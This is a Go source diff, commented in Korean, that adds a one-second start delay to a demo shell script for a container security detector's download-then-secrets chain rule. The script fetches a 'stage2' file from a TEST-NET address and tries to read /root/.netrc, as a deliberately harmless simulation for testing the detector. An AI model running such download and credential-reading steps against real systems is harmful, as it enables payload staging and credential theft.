@@ -57,11 +57,14 @@ const (
 	StatusRefused  = "refused"
 )
 
-// ChainScript: chain 시연(11/04) 컨테이너의 셸 본문 — deploy/demo/run-attacker.sh SCENARIO=chain 과 같은 동작(CHAIN_GAP=1 고정, 반복 · 대기 없음).
+// ChainScript: chain 시연(11/04) 컨테이너의 셸 본문 — deploy/demo/run-attacker.sh SCENARIO=chain 과 같은 세 단계(CHAIN_GAP=1 고정, 반복 없음)에 시작 대기 1초를 더했다.
 // 무해: wget 은 TEST-NET(203.0.113.7, 라우팅 안 됨)이라 아무것도 받지 못하고, /root/.netrc 는 없는 파일이라 여는 시도만 한다.
-// 연쇄 규칙 chain-download-secrets 의 세 단계(exec wget → 내부망 밖 connect → open 자격 증명 경로)를 1~4초 안에 차례로 낸다.
+// 시작 대기(11/09): 첫 동작 전 sleep 1 — Docker Desktop 은 컨테이너 발견이 docker-events 라 시작 직후 약 0.1초를 못 본다
+// (11/09 Mac 실측: 1단계 wget exec 를 놓쳐 sandbox-secrets 1건만 · 종료 0). sg-vm(fanotify)은 대기 없이도 no-shell-download 로 1단계 격리(137).
+// 연쇄 규칙 chain-download-secrets 의 세 단계(exec wget → 내부망 밖 connect → open 자격 증명 경로)를 1~4초 안에 차례로 낸다(대기는 첫 단계 앞이라 단계 사이 간격은 그대로).
 // TEST-NET 연결은 실패할 때(약 3초 뒤) connect 이벤트가 나오므로 파일 열기는 그 뒤 1초에 둔다(순서가 뒤집히지 않게)
-const ChainScript = `echo "[demo] chain start"
+const ChainScript = `sleep 1
+echo "[demo] chain start"
 timeout 3 wget -q -O /dev/null http://203.0.113.7/stage2 || true
 sleep 1
 cat /root/.netrc >/dev/null 2>&1 || true
